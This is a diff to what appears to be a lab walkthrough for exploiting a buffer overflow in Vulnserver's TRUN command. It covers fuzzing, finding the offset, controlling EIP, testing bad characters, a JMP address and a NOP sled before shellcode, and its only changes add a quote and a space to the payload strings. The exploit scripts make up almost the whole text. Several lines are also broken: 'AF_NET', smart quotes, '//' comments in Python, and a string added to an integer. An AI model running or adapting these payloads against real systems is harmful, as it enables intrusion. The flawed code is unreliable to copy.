@@ -99,8 +99,8 @@ buffer = A * 100
 while True:  
     try:  
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
-        s.connect(('192.168.x.x,9999))  
-        s.send(('TRUN /.:/' + buffer)) // Added the .: just because we saw that it runs when we send TRUN before the chars begin.  
+        s.connect(('192.168.x.x,9999'))  
+        s.send(('TRUN /.:/ ' + buffer)) // Added the .: just because we saw that it runs when we send TRUN before the chars begin.  
         s.close()  
         sleep(1)
         buffer = buffer + “A”*100 // If 100 wasn't enough, let's grow exponentially  
@@ -133,7 +133,7 @@ offset = "<paste code here>
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
-    s.send(('TRUN /.:/' + offset)) // send the value  
+    s.send(('TRUN /.:/ ' + offset)) // send the value  
     s.close()  
 except:  
     print “Error connecting to server”  
@@ -161,7 +161,7 @@ shellcode = “A”*2003 + “B” * 4 // offset filler up to EIP, then 4 B's wi
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
-    s.send(('TRUN /.:/' + shellcode))  
+    s.send(('TRUN /.:/ ' + shellcode))  
     s.close()  
 except:  
     print “Error connecting to server”  
@@ -194,7 +194,7 @@ shellcode = “A”*2003 + badChars // offset filler up to EIP, then badChars in
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
-    s.send(('TRUN /.:/' + shellcode))  
+    s.send(('TRUN /.:/ ' + shellcode))  
     s.close()  
 except:  
     print “Error connecting to server”  
@@ -255,7 +255,7 @@ shellcode = “A”*2003 + “\xaf\x11\x50\x62” // ← this is the 625011af fi
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
-    s.send(('TRUN /.:/' + shellcode))  
+    s.send(('TRUN /.:/ ' + shellcode))  
     s.close()  
 except:  
     print “Error connecting to server”  
@@ -289,7 +289,7 @@ shellcode = “A”*2003 + “\xaf\x11\x50\x62” + “\x90” + 32 + overflow
 try:  
     s=socket(socket.AF_NET,socket.SOCK_STREAM)  
     s.connect(('192.168.x.x',9999))  
-    s.send(('TRUN /.:/' + shellcode))  
+    s.send(('TRUN /.:/ ' + shellcode))  
     s.close()  
 except:  
     print “Error connecting to server”  
